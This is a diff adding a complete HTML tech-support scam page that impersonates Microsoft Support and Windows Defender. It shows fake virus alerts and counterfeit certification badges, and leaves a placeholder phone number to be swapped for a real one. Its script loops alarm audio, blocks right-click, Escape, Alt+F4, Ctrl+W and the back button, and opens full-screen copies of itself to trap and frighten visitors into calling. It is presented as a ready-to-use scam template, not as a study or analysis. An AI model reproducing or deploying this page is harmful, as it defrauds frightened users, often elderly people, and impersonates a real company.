@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Support - Critical Security Alert</title>
+    <style>
+        :root {
+            --color-white: rgba(255, 255, 255, 1);
+            --color-black: rgba(0, 0, 0, 1);
+            --color-gray-200: rgba(245, 245, 245, 1);
+            --color-gray-800: rgba(38, 40, 40, 1);
+            --color-red-500: rgba(192, 21, 47, 1);
+            --color-red-600: rgba(220, 38, 38, 1);
+            --font-family-base: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-family-base);
+            background-color: #ffffff;
+            color: #333;
+            overflow: auto;
+            min-height: 100vh;
+        }
+
+        /* Main Support Page Styles */
+        .support-page {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+
+        /* Certification Badges */
+        .certifications {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+            padding: 15px 0;
+        }
+
+        .cert-badge {
+            width: 75px;
+            height: 95px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            filter: drop-shadow(0 2px 6px rgba(0, 0, 0, 0.25));
+            transition: transform 0.3s ease, filter 0.3s ease;
+            cursor: pointer;
+        }
+
+        .cert-badge:hover {
+            transform: scale(1.12);
+            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.35));
+        }
+
+        .cert-badge svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
+            color: white;
+            margin-bottom: 40px;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .header-logo {
+            max-width: 200px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        .header h1 {
+            font-size: 36px;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 18px;
+            opacity: 0.9;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 24px;
+            margin: 40px 0;
+        }
+
+        .service-card {
+            background: #f8f8f8;
+            padding: 30px;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .service-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .service-card h3 {
+            color: #0078d4;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+
+        .service-card p {
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .contact-section {
+            background: #0078d4;
+            color: white;
+            padding: 40px;
+            text-align: center;
+            border-radius: 8px;
+            margin: 40px 0;
+        }
+
+        .contact-section h2 {
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+
+        .contact-phone {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 20px 0;
+            letter-spacing: 1px;
+        }
+
+        /* Security Alert Overlay */
+        .security-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        .security-alert {
+            background-color: #2d2d2d;
+            border: 2px solid #444;
+            border-radius: 8px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+            animation: slideDown 0.4s ease-out;
+        }
+
+        .alert-header {
+            background-color: #1a1a1a;
+            padding: 15px 20px;
+            border-bottom: 1px solid #444;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .warning-icon {
+            width: 24px;
+            height: 24px;
+            color: #fbbf24;
+            font-size: 24px;
+        }
+
+        .alert-title {
+            color: var(--color-red-600);
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .alert-body {
+            padding: 25px 20px;
+            background-color: #2d2d2d;
+        }
+
+        .alert-message {
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 15px;
+            color: #e5e5e5;
+        }
+
+        .support-number {
+            font-size: 15px;
+            font-weight: bold;
+            color: #60a5fa;
+            margin: 15px 0;
+            display: block;
+        }
+
+        .continue-text {
+            font-size: 13px;
+            color: #a3a3a3;
+            margin-top: 20px;
+        }
+
+        .alert-footer {
+            background-color: #1a1a1a;
+            padding: 15px 20px;
+            border-top: 1px solid #444;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .ok-button {
+            background-color: #60a5fa;
+            color: var(--color-white);
+            border: none;
+            padding: 10px 35px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .ok-button:hover {
+            background-color: #3b82f6;
+        }
+
+        .ok-button:active {
+            background-color: #2563eb;
+        }
+
+        /* Microsoft Support Popup */
+        .support-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        .support-popup {
+            background-color: var(--color-white);
+            border-radius: 0;
+            max-width: 600px;
+            width: 90%;
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+        }
+
+        .popup-header {
+            background-color: #0078d4;
+            padding: 10px 15px;
+            color: var(--color-white);
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .popup-content {
+            padding: 30px 25px;
+            background-color: var(--color-white);
+            color: #000;
+        }
+
+        .warning-banner {
+            background-color: #fff4e5;
+            border-left: 4px solid #ff6b6b;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .warning-text {
+            color: var(--color-red-500);
+            font-weight: bold;
+            font-size: 18px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .virus-details {
+            color: #333;
+            font-size: 14px;
+            line-height: 1.8;
+            margin: 15px 0;
+        }
+
+        .call-section {
+            background-color: #f0f0f0;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+            border: 2px solid #ff6b6b;
+        }
+
+        .call-text {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .phone-number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #0078d4;
+            margin: 10px 0;
+            display: block;
+            letter-spacing: 1px;
+            text-decoration: none;
+        }
+
+        .call-button {
+            background-color: #0078d4;
+            color: var(--color-white);
+            border: none;
+            padding: 15px 40px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background-color 0.3s;
+        }
+
+        .call-button:hover {
+            background-color: #005a9e;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* Disable text selection */
+        .security-alert, .support-popup {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Security Alert Popup (First Layer) -->
+    <div class="security-overlay" id="securityAlert">
+        <div class="security-alert">
+            <div class="alert-header">
+                <span class="warning-icon">⚠️</span>
+                <span class="alert-title">CRITICAL SECURITY ALERT!</span>
+            </div>
+            <div class="alert-body">
+                <p class="alert-message">Your system may be at risk!</p>
+                <p class="support-number">Call Tech Support: +1-800-XXX-XXXX</p>
+                <p class="continue-text">Click OK to continue...</p>
+            </div>
+            <div class="alert-footer">
+                <button class="ok-button" id="okButton">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Microsoft Support Popup (Second Layer) -->
+    <div class="support-overlay" id="supportPopup">
+        <div class="support-popup">
+            <div class="popup-header">
+                Microsoft Windows Defender
+            </div>
+            <div class="popup-content">
+                <div class="warning-banner">
+                    <div class="warning-text">
+                        WARNING! System may have detected viruses on your computer System May Have Found(2) Malicious Viruses:Rootkit, Sirefef.Spy And Trojan.FakeAV-Download. Your Personal &amp; Financial Information. MAY NOT BE SAFE. For Help Removing Viruses. Call Tech Support Online
+                    </div>
+                </div>
+
+                <div class="virus-details">
+                    <strong>Detected Threats:</strong><br>
+                    • Rootkit.Generic<br>
+                    • Sirefef.Spy<br>
+                    • Trojan.FakeAV-Download<br><br>
+                    <strong>Risk Level:</strong> Critical<br>
+                    <strong>Status:</strong> Immediate action required
+                </div>
+
+                <div class="call-section">
+                    <div class="call-text">
+                        Call Tech Support Immediately:
+                    </div>
+                    <a href="tel:+18005551234" class="phone-number" id="phoneNumber">
+                        +1-800-XXX-XXXX
+                    </a>
+                    <button class="call-button" id="callNowBtn">
+                        Call Now for Support
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Audio warning loop - embedded full audio -->
+    <audio id="warningAudio" loop autoplay>
+        <source src="WARNING.mp3" type="audio/mpeg">
+        Your browser does not support audio playback.
+    </audio>
+
+    <!-- Main Support Website (Background) -->
+    <div class="support-page">
+        <div class="header">
+            <img src="LOGO.jpg" alt="Microsoft Logo" class="header-logo">
+            <h1>Microsoft Technical Support</h1>
+            <p>Professional Support Services for Windows &amp; Microsoft Products</p>
+        </div>
+            <div class="certifications">
+                <div class="cert-badge" title="CompTIA A+ Certified">
+                    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="50" cy="50" r="45" fill="#FF6B35" stroke="#333" stroke-width="2"/>
+                        <path d="M 50 25 L 60 40 L 76 40 L 64 50 L 70 65 L 50 55 L 30 65 L 36 50 L 24 40 L 40 40 Z" fill="#FFD700"/>
+                        <text x="50" y="85" font-size="9" text-anchor="middle" font-weight="bold" fill="#333">CompTIA A+</text>
+                    </svg>
+                </div>
+                <div class="cert-badge" title="Microsoft Certified Technician">
+                    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="50" cy="50" r="45" fill="#0078D4" stroke="#333" stroke-width="2"/>
+                        <path d="M 50 25 L 60 40 L 76 40 L 64 50 L 70 65 L 50 55 L 30 65 L 36 50 L 24 40 L 40 40 Z" fill="#FFD700"/>
+                        <text x="50" y="85" font-size="7" text-anchor="middle" font-weight="bold" fill="white">Microsoft</text>
+                    </svg>
+                </div>
+                <div class="cert-badge" title="ISO 9001:2015 Certified">
+                    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="50" cy="50" r="45" fill="#1E90FF" stroke="#333" stroke-width="2"/>
+                        <path d="M 50 25 L 60 40 L 76 40 L 64 50 L 70 65 L 50 55 L 30 65 L 36 50 L 24 40 L 40 40 Z" fill="#FFD700"/>
+                        <text x="50" y="85" font-size="11" text-anchor="middle" font-weight="bold" fill="white">ISO 9001</text>
+                    </svg>
+                </div>
+                <div class="cert-badge" title="BBB Accredited">
+                    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="50" cy="50" r="45" fill="#228B22" stroke="#333" stroke-width="2"/>
+                        <path d="M 50 25 L 60 40 L 76 40 L 64 50 L 70 65 L 50 55 L 30 65 L 36 50 L 24 40 L 40 40 Z" fill="#FFD700"/>
+                        <text x="50" y="85" font-size="13" text-anchor="middle" font-weight="bold" fill="white">BBB</text>
+                    </svg>
+                </div>
+            </div>
+
+        <div class="contact-section">
+            <h2>24/7 Emergency Support Available</h2>
+            <p>Call us now for immediate assistance with critical issues</p>
+            <div class="contact-phone">+1-800-XXX-XXXX</div>
+            <p>Our certified technicians are standing by to help you</p>
+        </div>
+
+        <div class="services-grid">
+            <div class="service-card">
+                <h3>🛡️ Virus &amp; Malware Removal</h3>
+                <p>Expert removal of viruses, trojans, rootkits, and malicious software. Complete system scan and protection setup included.</p>
+            </div>
+
+            <div class="service-card">
+                <h3>⚡ Performance Optimization</h3>
+                <p>Speed up your computer with professional optimization. Remove bloatware, optimize startup, and enhance system performance.</p>
+            </div>
+
+            <div class="service-card">
+                <h3>🔒 Security Updates</h3>
+                <p>Critical security patches and Windows updates installation. Keep your system protected from the latest threats.</p>
+            </div>
+
+            <div class="service-card">
+                <h3>💾 Data Recovery</h3>
+                <p>Professional data recovery services for lost or corrupted files. We can help recover your important documents and photos.</p>
+            </div>
+
+            <div class="service-card">
+                <h3>🖥️ Remote Support</h3>
+                <p>Fast remote assistance from certified technicians. Get help without leaving your home or office.</p>
+            </div>
+
+            <div class="service-card">
+                <h3>📞 24/7 Support</h3>
+                <p>Round-the-clock support for critical issues. Our team is always available when you need help most.</p>
+            </div>
+        </div>
+
+        <div style="background: #f8f8f8; padding: 40px; border-radius: 8px; text-align: center; margin-top: 40px;">
+            <h2 style="color: #0078d4; margin-bottom: 20px;">Why Choose Our Support?</h2>
+            <div style="max-width: 800px; margin: 0 auto; text-align: left;">
+                <ul style="line-height: 2; color: #666;">
+                    <li>✓ Microsoft Certified Technicians</li>
+                    <li>✓ Same-Day Service Available</li>
+                    <li>✓ 100% Satisfaction Guarantee</li>
+                    <li>✓ Secure Remote Connections</li>
+                    <li>✓ Affordable Pricing Plans</li>
+                    <li>✓ Free Diagnostics</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Auto-play audio immediately and handle autoplay restrictions
+        window.addEventListener('DOMContentLoaded', function() {
+            const warningAudio = document.getElementById('warningAudio');
+            
+            // Try to play immediately
+            const playPromise = warningAudio.play();
+            
+            if (playPromise !== undefined) {
+                playPromise.then(function() {
+                    console.log('Audio playing');
+                }).catch(function(error) {
+                    console.log('Autoplay prevented, will play on user interaction');
+                    // If autoplay is blocked, play on any user interaction
+                    const playOnInteraction = function() {
+                        warningAudio.play();
+                        document.removeEventListener('click', playOnInteraction);
+                        document.removeEventListener('touchstart', playOnInteraction);
+                        document.removeEventListener('keydown', playOnInteraction);
+                    };
+                    
+                    document.addEventListener('click', playOnInteraction);
+                    document.addEventListener('touchstart', playOnInteraction);
+                    document.addEventListener('keydown', playOnInteraction);
+                });
+            }
+        });
+
+        // Configuration
+        const PHONE_NUMBER = '+1-800-XXX-XXXX'; // Replace with your actual number
+
+        // Update phone numbers throughout the page
+        document.querySelectorAll('.support-number, .contact-phone').forEach(el => {
+            el.textContent = PHONE_NUMBER;
+        });
+
+        document.getElementById('phoneNumber').textContent = PHONE_NUMBER;
+        document.getElementById('phoneNumber').href = 'tel:' + PHONE_NUMBER.replace(/[^0-9+]/g, '');
+
+        // Security Alert OK button
+        document.getElementById('okButton').addEventListener('click', function() {
+            document.getElementById('securityAlert').style.display = 'none';
+            document.getElementById('supportPopup').style.display = 'flex';
+        });
+
+        // Call Now button - opens same page in new fullscreen window
+        document.getElementById('callNowBtn').addEventListener('click', function() {
+            // Open in new window maximized
+            const newWindow = window.open(
+                window.location.href, 
+                '_blank',
+                'width=' + screen.width + ',height=' + screen.height + ',left=0,top=0,scrollbars=yes,resizable=yes'
+            );
+            
+            if (newWindow) {
+                // Try to request fullscreen after page loads
+                newWindow.addEventListener('load', function() {
+                    setTimeout(function() {
+                        try {
+                            if (newWindow.document.documentElement.requestFullscreen) {
+                                newWindow.document.documentElement.requestFullscreen();
+                            } else if (newWindow.document.documentElement.webkitRequestFullscreen) {
+                                newWindow.document.documentElement.webkitRequestFullscreen();
+                            } else if (newWindow.document.documentElement.mozRequestFullScreen) {
+                                newWindow.document.documentElement.mozRequestFullScreen();
+                            } else if (newWindow.document.documentElement.msRequestFullscreen) {
+                                newWindow.document.documentElement.msRequestFullscreen();
+                            }
+                        } catch(err) {
+                            console.log('Fullscreen request failed - user interaction required');
+                        }
+                    }, 1000);
+                });
+                
+                // Try to focus and maximize
+                newWindow.focus();
+            }
+            
+            // Also initiate call
+            setTimeout(function() {
+                window.location.href = 'tel:' + PHONE_NUMBER.replace(/[^0-9+]/g, '');
+            }, 500);
+        });
+
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // Disable keyboard shortcuts (with 10-second timer)
+        let escapeDisabled = true;
+        
+        // Re-enable Escape after 10 seconds
+        setTimeout(function() {
+            escapeDisabled = false;
+        }, 10000);
+        
+        document.addEventListener('keydown', function(e) {
+            // Prevent Escape key for first 10 seconds
+            if ((e.key === 'Escape' || e.keyCode === 27) && escapeDisabled) {
+                e.preventDefault();
+                return false;
+            }
+            // Prevent Alt+F4
+            if (e.altKey && e.key === 'F4') {
+                e.preventDefault();
+                return false;
+            }
+            // Prevent Ctrl+W
+            if (e.ctrlKey && e.key === 'w') {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Prevent popup close on background click
+        document.getElementById('securityAlert').addEventListener('click', function(e) {
+            if (e.target === this) {
+                e.preventDefault();
+            }
+        });
+
+        document.getElementById('supportPopup').addEventListener('click', function(e) {
+            if (e.target === this) {
+                e.preventDefault();
+            }
+        });
+
+        // Prevent back button
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.go(1);
+        };
+    </script>
+</body>
+</html>
